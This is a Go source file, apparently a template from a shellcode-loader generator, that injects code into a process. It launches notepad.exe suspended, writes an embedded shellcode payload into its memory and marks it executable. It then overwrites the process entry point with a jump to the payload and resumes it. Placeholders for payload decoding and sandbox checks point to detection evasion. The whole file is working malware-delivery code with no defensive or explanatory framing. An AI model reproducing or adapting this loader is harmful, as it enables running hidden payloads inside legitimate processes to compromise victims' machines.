package main

import (
	_ "embed"
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	//__IMPORT__
)

type PEB struct {
	InheritedAddressSpace    byte
	ReadImageFileExecOptions byte
	BeingDebugged            byte
	reserved2                [1]byte
	Mutant                   uintptr
	ImageBaseAddress         uintptr
	Ldr                      uintptr
	ProcessParameters        uintptr
	reserved4                [3]uintptr
	AtlThunkSListPtr         uintptr
	reserved5                uintptr
	reserved6                uint32
	reserved7                uintptr
	reserved8                uint32
	AtlThunkSListPtr32       uint32
	reserved9                [45]uintptr
	reserved10               [96]byte
	PostProcessInitRoutine   uintptr
	reserved11               [128]byte
	reserved12               [1]uintptr
	SessionId                uint32
}

type ProcessBasicInformation struct {
	reserved1                    uintptr
	PebBaseAddress               uintptr
	reserved2                    [2]uintptr
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessID uintptr
}

type ImageDosHeader struct {
	Magic    uint16
	Cblp     uint16
	Cp       uint16
	Crlc     uint16
	Cparhdr  uint16
	MinAlloc uint16
	MaxAlloc uint16
	SS       uint16
	SP       uint16
	CSum     uint16
	IP       uint16
	CS       uint16
	LfaRlc   uint16
	Ovno     uint16
	Res      [4]uint16
	OEMID    uint16
	OEMInfo  uint16
	Res2     [10]uint16
	LfaNew   int32
}

type ImageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type ImageOptionalHeader64 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}

type ImageOptionalHeader32 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	BaseOfData                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}

//go:embed shellcode
var shellcode []byte

//__DECODE__

func main() {
	//__SANDBOX__
	program := "C:\\Windows\\System32\\notepad.exe"
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	appName, _ := syscall.UTF16PtrFromString(program)
	commandLine, _ := syscall.UTF16PtrFromString("")
	_ = windows.CreateProcess(
		appName,
		commandLine,
		nil,
		nil,
		true,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		startupInfo,
		procInfo,
	)
	addr, _, _ := VirtualAllocEx.Call(
		uintptr(procInfo.Process),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,
	)
	fmt.Println("ok")
	_, _, _ = WriteProcessMemory.Call(
		uintptr(procInfo.Process),
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	oldProtect := windows.PAGE_READWRITE
	_, _, _ = VirtualProtectEx.Call(
		uintptr(procInfo.Process),
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	var processInformation ProcessBasicInformation
	var returnLength uintptr

	_, _, _ = NtQueryInformationProcess.Call(
		uintptr(procInfo.Process),
		0,
		uintptr(unsafe.Pointer(&processInformation)),
		unsafe.Sizeof(processInformation),
		returnLength,
	)
	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")

	var peb PEB
	var readBytes int32

	_, _, _ = ReadProcessMemory.Call(
		uintptr(procInfo.Process),
		processInformation.PebBaseAddress,
		uintptr(unsafe.Pointer(&peb)),
		unsafe.Sizeof(peb),
		uintptr(unsafe.Pointer(&readBytes)),
	)

	var dosHeader ImageDosHeader
	var readBytes2 int32

	_, _, _ = ReadProcessMemory.Call(
		uintptr(procInfo.Process),
		peb.ImageBaseAddress,
		uintptr(unsafe.Pointer(&dosHeader)),
		unsafe.Sizeof(dosHeader),
		uintptr(unsafe.Pointer(&readBytes2)),
	)

	var Signature uint32
	var readBytes3 int32

	_, _, _ = ReadProcessMemory.Call(
		uintptr(procInfo.Process),
		peb.ImageBaseAddress+uintptr(dosHeader.LfaNew),
		uintptr(unsafe.Pointer(&Signature)),
		unsafe.Sizeof(Signature),
		uintptr(unsafe.Pointer(&readBytes3)),
	)

	var peHeader ImageFileHeader
	var readBytes4 int32

	_, _, _ = ReadProcessMemory.Call(
		uintptr(procInfo.Process),
		peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature),
		uintptr(unsafe.Pointer(&peHeader)),
		unsafe.Sizeof(peHeader),
		uintptr(unsafe.Pointer(&readBytes4)),
	)

	var optHeader64 ImageOptionalHeader64
	var optHeader32 ImageOptionalHeader32
	var readBytes5 int32

	if peHeader.Machine == 34404 {
		_, _, _ = ReadProcessMemory.Call(
			uintptr(procInfo.Process),
			peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader),
			uintptr(unsafe.Pointer(&optHeader64)),
			unsafe.Sizeof(optHeader64),
			uintptr(unsafe.Pointer(&readBytes5)),
		)
	} else if peHeader.Machine == 332 {
		_, _, _ = ReadProcessMemory.Call(
			uintptr(procInfo.Process),
			peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader),
			uintptr(unsafe.Pointer(&optHeader32)),
			unsafe.Sizeof(optHeader32),
			uintptr(unsafe.Pointer(&readBytes5)),
		)
	}

	var ep uintptr
	if peHeader.Machine == 34404 {
		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
	} else if peHeader.Machine == 332 {
		ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
	}

	var epBuffer []byte
	var shellcodeAddressBuffer []byte

	if peHeader.Machine == 34404 {
		epBuffer = append(epBuffer, byte(0x48))
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 8)
		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else if peHeader.Machine == 332 {
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	}

	epBuffer = append(epBuffer, byte(0xff))
	epBuffer = append(epBuffer, byte(0xe0))

	_, _, _ = WriteProcessMemory.Call(
		uintptr(procInfo.Process),
		ep,
		uintptr(unsafe.Pointer(&epBuffer[0])),
		uintptr(len(epBuffer)),
	)

	_, _ = windows.ResumeThread(procInfo.Thread)
	_ = windows.CloseHandle(procInfo.Process)
	_ = windows.CloseHandle(procInfo.Thread)
}
